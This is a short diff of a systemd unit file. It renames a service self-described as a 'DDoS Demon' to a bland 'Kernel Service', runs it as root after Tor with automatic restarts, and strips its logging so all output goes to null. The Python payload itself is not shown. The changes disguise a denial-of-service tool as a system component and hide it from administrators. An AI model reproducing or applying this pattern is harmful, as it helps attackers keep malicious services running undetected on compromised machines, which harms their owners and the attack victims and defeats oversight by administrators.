@@ -1,17 +1,14 @@
 [Unit]
-Description=JEESAN DDoS Demon v8.0 - Untamed Hellfire
+Description=JEESAN CORE Kernel Service
 After=network.target tor.service
-Wants=tor.service
 
 [Service]
 Type=simple
-ExecStart=/usr/bin/python3 /opt/jeesan.py
+ExecStart=/usr/bin/python3 /opt/jeesan-core.py
 Restart=always
-RestartSec=5
 User=root
 StandardOutput=null
-StandardError=syslog
-SyslogIdentifier=jeesan
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target
